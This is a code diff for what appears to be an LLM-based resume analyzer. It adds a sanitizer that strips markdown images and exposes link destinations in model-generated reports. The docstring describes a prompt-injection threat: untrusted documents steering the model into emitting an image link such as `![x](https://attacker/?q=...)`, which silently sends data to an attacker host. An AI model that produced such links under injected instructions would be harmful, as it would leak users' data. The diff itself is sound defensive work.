@@ -58,6 +58,20 @@ def _tidy_markdown(text: str, demote_headings: bool = False) -> str:
     return re.sub(r"\n{3,}", "\n\n", text)
 
 
+_MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)|!\[[^\]]*\]\[[^\]]*\]|<img\b[^>]*>", re.IGNORECASE)
+_MD_LINK = re.compile(r"\[([^\]]+)\]\(\s*([^)\s]+)[^)]*\)")
+_MD_REF_DEFINITION = re.compile(r"(?m)^\s*\[[^\]]+\]:\s*\S+.*$")
+
+
+def _neutralize_markdown(text: str) -> str:
+    """The report is model output and the model reads untrusted documents, so it may be steered into
+    emitting `![x](https://attacker/?q=...)`, which the browser would fetch with no click. Drop images
+    and show links as plain 'text (url)' so a disguised link can't hide its destination."""
+    text = _MD_IMAGE.sub("", text)
+    text = _MD_REF_DEFINITION.sub("", text)
+    return _MD_LINK.sub(r"\1 (\2)", text)
+
+
 def _count_source_bullets(text: str) -> int:
     """Lines of the extracted resume that look like bullet points."""
     return len(re.findall(r"(?m)^\s*[-\u2022*\u25aa\u25e6]\s+\S", text))
@@ -231,7 +245,7 @@ class LLMAnalyzer:
                 provider, model = "Mock", "mock"
             elapsed = time.time() - start_time
 
-            report, scores = self._ensure_scores(_tidy_markdown(report, demote_headings=True), safe_resume, safe_jd)
+            report, scores = self._ensure_scores(_neutralize_markdown(_tidy_markdown(report, demote_headings=True)), safe_resume, safe_jd)
             self.logger.info(f"Analysis by {model} took {elapsed:.2f}s — {len(report)} chars (content not logged).")
             return report, {
                 "llm_provider": provider,
